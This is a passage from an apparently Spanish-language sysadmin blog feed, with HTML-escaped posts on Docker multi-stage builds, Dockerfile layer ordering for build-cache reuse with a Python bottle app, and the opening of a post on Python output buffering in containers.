00f017a8c2a6        &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;sh&amp;quot;]                   0B                  &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:c9ecd8ff00c653f...   1.11MB              &lt;/span&gt;
gerard@aldebaran:~/docker/bigfiles$ docker &lt;span class="nb"&gt;history&lt;/span&gt; final
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
c672e1ad3fcb        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;ls&amp;quot; &amp;quot;-lh&amp;quot; &amp;quot;/&amp;quot;]         0B                  &lt;/span&gt;
57b8aa7c2aeb        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:5e392ba9fe1d0a...   105MB               &lt;/span&gt;
00f017a8c2a6        &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;sh&amp;quot;]                   0B                  &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:c9ecd8ff00c653f...   1.11MB              &lt;/span&gt;
gerard@aldebaran:~/docker/bigfiles$ docker run --rm final &lt;span class="p"&gt;|&lt;/span&gt; grep bigfile
-rwxrwxrwx    &lt;span class="m"&gt;1&lt;/span&gt; root     root      &lt;span class="m"&gt;100&lt;/span&gt;.0M May  &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="m"&gt;13&lt;/span&gt;:53 bigfile
gerard@aldebaran:~/docker/bigfiles$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto limita mucho el uso de esta solución.&lt;/p&gt;
&lt;h3&gt;Build container pattern&lt;/h3&gt;
&lt;p&gt;Construir nuestros artefactos en la misma imagen que los va a ejecutar es una guarrada. El truco era tener una imagen para construir el artefacto, y se pasaba a una imagen de &lt;em&gt;runtime&lt;/em&gt; mediante un uso inteligente de volúmenes. Con el nuevo &lt;strong&gt;COPY --from&lt;/strong&gt; no necesitamos el paso intermedio de volúmenes, y se puede hacer todo con un solo paso.&lt;/p&gt;
&lt;p&gt;Supongamos que queremos crear un programa en C, compilarlo y tener una imagen que se limite a ejecutarlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/test$ cat hello.c 
&lt;span class="c1"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="c1"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

int main&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    printf&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Hello world!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    exit&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/test$ cat Dockerfile 
FROM alpine:3.5 AS builder
RUN apk add --no-cache gcc musl-dev
COPY hello.c /
RUN gcc -static -o /hello /hello.c &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    strip /hello

FROM scratch
COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /hello /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/hello&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, la primera imagen compila nuestro código fuente, y la segunda se limita a copiar el resultado, que al tratarse de un binario estático no necesita librerías adicionales, lo que nos permite partir de la imagen vacía &lt;em&gt;scratch&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/test$ docker build -t hello .
Sending build context to Docker daemon  &lt;span class="m"&gt;3&lt;/span&gt;.072kB
...  
Step &lt;span class="m"&gt;5&lt;/span&gt;/7 : FROM scratch
 ---&amp;gt; 
Step &lt;span class="m"&gt;6&lt;/span&gt;/7 : COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /hello /
 ---&amp;gt; b01e9f03b69d
Removing intermediate container c177f03a3dab
Step &lt;span class="m"&gt;7&lt;/span&gt;/7 : CMD /hello
 ---&amp;gt; Running in e19eb91bc975
 ---&amp;gt; fb52f56a9c03
Removing intermediate container e19eb91bc975
Successfully built fb52f56a9c03
Successfully tagged hello:latest
gerard@aldebaran:~/docker/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto podemos desechar la imagen de compilación que es muy grande, en favor a una imagen de &lt;em&gt;runtime&lt;/em&gt; sin compiladores ni librerías, sin necesidad de preocuparnos de limpiar aquello que se haya instalado para compilar nuestro binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/test$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello               latest              fb52f56a9c03        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       &lt;span class="m"&gt;10&lt;/span&gt;.1kB
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              fe6a6edae999        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       101MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.5                 4a415e366388        &lt;span class="m"&gt;2&lt;/span&gt; months ago        &lt;span class="m"&gt;3&lt;/span&gt;.99MB
gerard@aldebaran:~/docker/test$ docker run -ti --rm hello
Hello world!
gerard@aldebaran:~/docker/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente interesante ver que hacen falta 101mb para construir un binario que solo necesita 10kb para ejecutarse...&lt;/p&gt;</content><category term="docker"></category><category term="dockerfile"></category><category term="multistage"></category><category term="build"></category></entry><entry><title>Reduciendo el tiempo de build con Docker y su caché</title><link href="https://www.linuxsysadmin.ml/2017/05/reduciendo-el-tiempo-de-build-con-docker-y-su-cache.html" rel="alternate"></link><published>2017-05-08T10:00:00+02:00</published><updated>2017-05-08T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-08:/2017/05/reduciendo-el-tiempo-de-build-con-docker-y-su-cache.html</id><summary type="html">&lt;p&gt;Cuando construimos imágenes &lt;strong&gt;docker&lt;/strong&gt;, muchas veces no somos conscientes del poder de la caché integrada. Si reordenamos algunas instrucciones y aplicamos algún truco, podemos evitarnos el hecho de reconstruir muchas de esas capas, llegando a reducir el tiempo de &lt;em&gt;rebuild&lt;/em&gt; a prácticamente cero, siempre y cuando no hayan grandes cambios …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando construimos imágenes &lt;strong&gt;docker&lt;/strong&gt;, muchas veces no somos conscientes del poder de la caché integrada. Si reordenamos algunas instrucciones y aplicamos algún truco, podemos evitarnos el hecho de reconstruir muchas de esas capas, llegando a reducir el tiempo de &lt;em&gt;rebuild&lt;/em&gt; a prácticamente cero, siempre y cuando no hayan grandes cambios.&lt;/p&gt;
&lt;p&gt;Esa es una reflexión que me hice el otro día. Es verdad que con la caché integrada me ahorro de descargar la imagen base y de instalar algunas dependencias habituales, pero usando la cabeza descubrí que puedo conseguir mucho más.&lt;/p&gt;
&lt;p&gt;Es muy habitual que tenga que construir proyectos que usen &lt;strong&gt;python&lt;/strong&gt;, pero me molesta un poco tener que perder el tiempo en el comando &lt;strong&gt;pip&lt;/strong&gt; instalando dependencias; hay que tener en cuenta que casi nunca cambian entre diferentes versiones y es un tiempo que no sería necesario.&lt;/p&gt;
&lt;p&gt;Así que hice el ejercicio de reordenar las instrucciones en mi &lt;em&gt;Dockerfile&lt;/em&gt;, moviendo al principio aquellas instrucciones que raramente provocarán cambios, y dejando al final aquellas que es más frecuente que cambien, y por lo tanto, que necesiten ser reconstruidas.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Para empezar, vamos a usar un aplicación simple, concretamente un &lt;em&gt;hello world&lt;/em&gt; estándar con un &lt;em&gt;microframework&lt;/em&gt; llamado &lt;strong&gt;bottle&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ tree
.
├── app
│   ├── app.py
│   └── requirements.txt
└── Dockerfile

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Realmente la aplicación es lo de menos, siendo este ejemplo extrapolable a cada &lt;em&gt;framework&lt;/em&gt; o librería que se necesite; se incluyen por tener el ejemplo completo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat app/app.py 
from bottle import Bottle

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ cat app/requirements.txt 
&lt;span class="nv"&gt;bottle&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.13
gerard@aldebaran:~/docker/myapp$ cat app/app.py 
from bottle import Bottle

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para construir la imagen, usamos un &lt;em&gt;Dockerfile&lt;/em&gt; muy estándar y nada complejo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat Dockerfile
FROM alpine:3.5
RUN apk add --no-cache py-gunicorn py2-pip
COPY app/ /srv/app/
RUN pip install -r /srv/app/requirements.txt
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8080&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--user=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--group=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--workers=2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--chdir=/srv/app&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app:app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así que construimos nuestra imagen, con el comando habitual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.0 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Successfully built 46611b6a730f
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No es difícil comprobar lo que pasa cuando modificamos un poco nuestra aplicación, que en este caso se localiza entera en &lt;em&gt;app.py&lt;/em&gt;: se reconstruyen todos los pasos a partir del tercero (el COPY).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.1 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/5 : FROM alpine:3.5
 ---&amp;gt; 4a415e366388
Step &lt;span class="m"&gt;2&lt;/span&gt;/5 : RUN apk add --no-cache py-gunicorn py2-pip
 ---&amp;gt; Using cache
 ---&amp;gt; fa57ea0220f9
Step &lt;span class="m"&gt;3&lt;/span&gt;/5 : COPY app/ /srv/app/
 ---&amp;gt; dcaa218d663e
Removing intermediate container 800e88f3a533
Step &lt;span class="m"&gt;4&lt;/span&gt;/5 : RUN pip install -r /srv/app/requirements.txt
 ---&amp;gt; Running in 29914cddfb3d
Collecting &lt;span class="nv"&gt;bottle&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.13 &lt;span class="o"&gt;(&lt;/span&gt;from -r /srv/app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading bottle-0.12.13.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;70kB&lt;span class="o"&gt;)&lt;/span&gt;
Installing collected packages: bottle
  Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; bottle: started
    Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; bottle: finished with status &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;
Successfully installed bottle-0.12.13
You are using pip version &lt;span class="m"&gt;9&lt;/span&gt;.0.0, however version &lt;span class="m"&gt;9&lt;/span&gt;.0.1 is available.
You should consider upgrading via the &lt;span class="s1"&gt;&amp;#39;pip install --upgrade pip&amp;#39;&lt;/span&gt; command.
 ---&amp;gt; 4e294d8038a8
Removing intermediate container 29914cddfb3d
Step &lt;span class="m"&gt;5&lt;/span&gt;/5 : CMD gunicorn --bind&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080 --user&lt;span class="o"&gt;=&lt;/span&gt;nobody --group&lt;span class="o"&gt;=&lt;/span&gt;nobody --workers&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --chdir&lt;span class="o"&gt;=&lt;/span&gt;/srv/app app:app
 ---&amp;gt; Running in 6021cfceff96
 ---&amp;gt; b781e46aec9c
Removing intermediate container 6021cfceff96
Successfully built b781e46aec9c
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, vamos a intentar mejorar eso.&lt;/p&gt;
&lt;h3&gt;Reordenamos las capas: las menos probables de cambio, antes&lt;/h3&gt;
&lt;p&gt;En este ejemplo, no hay mucho que cambiar; solo hay una instrucción que es siempre la misma (el CMD), pero que se reconstruye porque las anteriores también lo hacen. En este caso, solo le indica el comando de &lt;em&gt;runtime&lt;/em&gt;, y para esto no se depende ni del COPY, ni del &lt;em&gt;pip install&lt;/em&gt;, así que puede ir antes de ambas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat Dockerfile
FROM alpine:3.5
RUN apk add --no-cache py-gunicorn py2-pip
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8080&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--user=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--group=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--workers=2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--chdir=/srv/app&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app:app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
COPY app/ /srv/app/
RUN pip install -r /srv/app/requirements.txt
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto no nos queda más remedio que reconstruir las 3 capas de nuevo, pero vemos que los &lt;em&gt;builds&lt;/em&gt; sucesivos (con la aplicación modificada) no van a provocar cambio en esa capa.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.2 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Successfully built b9ca6021019e
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cambiamos nuestra aplicación, y vemos que el paso CMD no se reconstruye:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.3 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Step &lt;span class="m"&gt;3&lt;/span&gt;/5 : CMD gunicorn --bind&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080 --user&lt;span class="o"&gt;=&lt;/span&gt;nobody --group&lt;span class="o"&gt;=&lt;/span&gt;nobody --workers&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --chdir&lt;span class="o"&gt;=&lt;/span&gt;/srv/app app:app
 ---&amp;gt; Using cache
 ---&amp;gt; 0e99aa9dd9cf
...  
Successfully built b4289c56e7cb
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos ahorramos reconstruir capas que realmente no cambian, pero ven forzada su reconstrucción porque las capas anteriores sí lo hacen. En un caso más complejo, el beneficio se notaría más que en este pequeño ejemplo.&lt;/p&gt;
&lt;h3&gt;Copias parciales para ahorrarnos capas&lt;/h3&gt;
&lt;p&gt;El ejemplo anterior ha supuesto una mejora, pero vemos un hecho curioso: el &lt;em&gt;pip install&lt;/em&gt; es el paso más lento en una reconstrucción y no sería necesario en caso de no cambiar las dependencias de nuestra aplicación, que es la mayoría de veces. Entonces, ¿Porqué se tiene que rehacer cada vez, para obtener exactamente el mismo resultado?&lt;/p&gt;
&lt;p&gt;Simplemente se hace porque al copiar la carpeta, &lt;strong&gt;docker&lt;/strong&gt; detecta un cambio &lt;em&gt;en alguno&lt;/em&gt; de los ficheros, y por diseño, invalida la capa equivalente. Esto causa una invalidación de caché en cascada y obliga a las siguientes instrucciones a rehacerse.&lt;/p&gt;
&lt;p&gt;El truco consiste en copiar solamente el fichero de requisitos, con la esperanza de que no haya cambiado, lo que nos ahorraría el &lt;em&gt;pip install&lt;/em&gt;, ya que no invalidaría las capas de caché. El resto de la aplicación se puede copiar después.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ cat Dockerfile
FROM alpine:3.5
RUN apk add --no-cache py-gunicorn py2-pip
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8080&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--user=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--group=nobody&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--workers=2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--chdir=/srv/app&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app:app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
COPY app/requirements.txt /srv/app/
RUN pip install -r /srv/app/requirements.txt
COPY app/ /srv/app/
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen dos veces, una para crear la nueva estructura de capas (el precio de la primera construcción), y la otra para ver el beneficio de la nueva aproximación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker build -t myapp:1.4 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
...  
Successfully built c64016c758a4
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y a partir de ahora, cada cambio de código que no implique un cambio en el &lt;em&gt;requirements.txt&lt;/em&gt;, solo implicará copiar ese código sobre la capa que ya contiene nuestras dependencias, ahorrándonos el &lt;em&gt;pip install&lt;/em&gt;, y convirtiendo el proceso de &lt;em&gt;build&lt;/em&gt; en algo casi instantáneo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ &lt;span class="nb"&gt;time&lt;/span&gt; docker build -t myapp:1.5 .
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.632kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/6 : FROM alpine:3.5
 ---&amp;gt; 4a415e366388
Step &lt;span class="m"&gt;2&lt;/span&gt;/6 : RUN apk add --no-cache py-gunicorn py2-pip
 ---&amp;gt; Using cache
 ---&amp;gt; fa57ea0220f9
Step &lt;span class="m"&gt;3&lt;/span&gt;/6 : CMD gunicorn --bind&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080 --user&lt;span class="o"&gt;=&lt;/span&gt;nobody --group&lt;span class="o"&gt;=&lt;/span&gt;nobody --workers&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --chdir&lt;span class="o"&gt;=&lt;/span&gt;/srv/app app:app
 ---&amp;gt; Using cache
 ---&amp;gt; 0e99aa9dd9cf
Step &lt;span class="m"&gt;4&lt;/span&gt;/6 : COPY app/requirements.txt /srv/app/
 ---&amp;gt; Using cache
 ---&amp;gt; 32595afecfc4
Step &lt;span class="m"&gt;5&lt;/span&gt;/6 : RUN pip install -r /srv/app/requirements.txt
 ---&amp;gt; Using cache
 ---&amp;gt; e37068fe5c99
Step &lt;span class="m"&gt;6&lt;/span&gt;/6 : COPY app/ /srv/app/
 ---&amp;gt; d31b7abdbfb2
Removing intermediate container 01e78f27475d
Successfully built d31b7abdbfb2

real    0m0.330s
user    0m0.004s
sys 0m0.004s
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, podemos ver que las capas compartidas entre las versiones con este nuevo truco se comparten casi todas. Esto hace que las nuevas versiones apenas ocupen espacio en disco (117 bytes en el ejemplo), siendo una capa con solamente nuestro código.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/myapp$ docker &lt;span class="nb"&gt;history&lt;/span&gt; myapp:1.4
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
c64016c758a4        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY dir:244f5d5a6f7ec84...   117B                &lt;/span&gt;
e37068fe5c99        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c pip install -r /srv/app/require...   573kB               
32595afecfc4        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:2f968d5854b929...   16B                 &lt;/span&gt;
0e99aa9dd9cf        &lt;span class="m"&gt;21&lt;/span&gt; minutes ago      /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;gunicorn&amp;quot; &amp;quot;--bind...   0B                  &lt;/span&gt;
fa57ea0220f9        &lt;span class="m"&gt;31&lt;/span&gt; minutes ago      /bin/sh -c apk add --no-cache py-gunicorn ...   &lt;span class="m"&gt;48&lt;/span&gt;.4MB              
4a415e366388        &lt;span class="m"&gt;6&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:730030a984f5f0c...   3.99MB              &lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ docker &lt;span class="nb"&gt;history&lt;/span&gt; myapp:1.5
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
d31b7abdbfb2        &lt;span class="m"&gt;3&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY dir:36a1b0f6acdabc2...   117B                &lt;/span&gt;
e37068fe5c99        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c pip install -r /srv/app/require...   573kB               
32595afecfc4        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:2f968d5854b929...   16B                 &lt;/span&gt;
0e99aa9dd9cf        &lt;span class="m"&gt;21&lt;/span&gt; minutes ago      /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;gunicorn&amp;quot; &amp;quot;--bind...   0B                  &lt;/span&gt;
fa57ea0220f9        &lt;span class="m"&gt;31&lt;/span&gt; minutes ago      /bin/sh -c apk add --no-cache py-gunicorn ...   &lt;span class="m"&gt;48&lt;/span&gt;.4MB              
4a415e366388        &lt;span class="m"&gt;6&lt;/span&gt; weeks ago         /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:730030a984f5f0c...   3.99MB              &lt;/span&gt;
gerard@aldebaran:~/docker/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La parte mala, es que el fichero &lt;em&gt;requirements.txt&lt;/em&gt; se copia dos veces en nuestra imagen, en ambos COPY. Con un poco de trabajo podría evitarse eso pero, puesto que ocupa relativamente poco, es un precio que estoy dispuesto a pagar para tener &lt;em&gt;builds&lt;/em&gt; instantáneos.&lt;/p&gt;</content><category term="docker"></category><category term="dockerfile"></category><category term="cache"></category></entry><entry><title>Problemas de log con docker y python</title><link href="https://www.linuxsysadmin.ml/2017/05/problemas-de-log-con-docker-y-python.html" rel="alternate"></link><published>2017-05-01T10:00:00+02:00</published><updated>2017-05-01T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-01:/2017/05/problemas-de-log-con-docker-y-python.html</id><summary type="html">&lt;p&gt;El otro día estaba haciendo un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt; que debía ejecutarse en un contenedor &lt;strong&gt;docker&lt;/strong&gt;. A pesar de la cantidad de &lt;em&gt;verbose&lt;/em&gt; que le puse, no era capaz de ver ningún texto cuando miraba los &lt;em&gt;logs&lt;/em&gt;. Tras mucha búsqueda, finalmente encontré el culpable en la variable de entorno &lt;strong&gt;PYTHONUNBUFFERED …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día estaba haciendo un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt; que debía ejecutarse en un contenedor &lt;strong&gt;docker&lt;/strong&gt;. A pesar de la cantidad de &lt;em&gt;verbose&lt;/em&gt; que le puse, no era capaz de ver ningún texto cuando miraba los &lt;em&gt;logs&lt;/em&gt;. Tras mucha búsqueda, finalmente encontré el culpable en la variable de entorno &lt;strong&gt;PYTHONUNBUFFERED&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; en sí mismo solo pretendía comprobar si habían eventos en una cola, para su posterior proceso. La sorpresa es que no podía ver nada cuando ejecutaba &lt;strong&gt;docker&lt;/strong&gt; en modo &lt;em&gt;detached&lt;/em&gt; o en &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;El problema&lt;/h2&gt;
&lt;p&gt;Para reducir mucho el problema, se plantea un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;poll.sh&lt;/em&gt; que emita un mensaje en la salida estándar cada segundo, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

